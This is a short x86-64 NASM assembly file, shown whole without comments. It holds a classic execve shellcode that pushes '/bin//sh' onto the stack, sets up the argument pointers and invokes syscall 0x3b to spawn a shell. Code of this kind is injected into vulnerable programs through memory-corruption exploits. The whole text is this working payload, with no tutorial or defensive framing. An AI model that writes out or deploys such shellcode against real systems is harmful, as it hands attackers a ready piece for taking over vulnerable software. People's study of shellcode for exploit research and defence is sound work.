BITS 64

section .text:

global _start

_start:

  xor rax,rax
  push rax
  mov rbx, 0x68732f2f6e69622f
  push rbx
  mov rdi,rsp
  push rax
  mov rdx,rsp
  push rdi
  mov rsi,rsp
  mov al,0x3b
  syscall

